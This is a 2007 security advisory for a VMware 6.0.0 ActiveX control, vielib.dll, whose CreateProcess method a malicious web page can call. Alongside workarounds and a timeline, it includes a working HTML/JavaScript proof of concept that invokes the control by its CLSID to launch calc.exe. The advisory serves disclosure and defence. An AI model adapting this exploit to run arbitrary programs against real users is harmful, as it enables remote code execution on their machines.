@@ -1,0 +1,74 @@
+:. GOODFELLAS Security Research TEAM  .:
+:. http://goodfellas.shellcode.com.ar .:
+
+VmWare Inc version 6.0.0 CreateProcess & CreateProcessEx Remode Code Execution Exploit
+======================================================================================
+
+Internal ID: VULWAR200707300.
+-----------
+
+Introduction
+------------
+vielib.dll is a library included in the Program Vmware Version 6.0.0 from Vmware Inc. Company.
+
+
+Tested In
+---------
+- Windows XP SP1/SP2 french/english with IE 6.0 / 7.0.
+
+
+Summary
+-------
+The CreateProcess & CreateProcessEx method doesn't check if they're being called
+from the application, or malicious users. Remote Attacker could craft a html page
+and execute code in a remote system with the actual user privileges.
+
+
+Impact
+------
+Any computer that uses this Sofware will be exposed to Remote Execution Code.
+
+
+Workaround
+----------
+- Activate the Kill bit zero in clsid:0F748FDE-0597-443C-8596-71854C5EA20A
+- Unregister vielib.dll using regsvr32.
+
+
+Timeline
+--------
+July 30 2007 -- Bug Discovery.
+July 30 2007 -- Exploit published.
+
+
+Credits
+-------
+ * callAX <callAX@shellcode.com.ar>
+ * GoodFellas Security Research Team  <goodfellas.shellcode.com.ar>
+ 
+
+Technical Details
+-----------------
+
+
+<HTML>
+<BODY>
+  <object id=_9090909090 classid="clsid:{0F748FDE-0597-443C-8596-71854C5EA20A}"></object>
+<SCRIPT>
+
+function _d0_() {
+ 
+ ba="c:\\windows\\system32\\calc.exe"
+ ad="c:\\windows\\system32\\calc.exe"
+ fO="c:\\windows\\system32\\"
+ Od=1
+
+_9090909090.CreateProcess(ba, ad, fO, Od)
+ }
+
+</SCRIPT>
+<input language=JavaScript onclick=_d0_() type=button value="Proof of Concept">
+</BODY>
+</HTML>
+
+# milw0rm.com [2007-07-30]
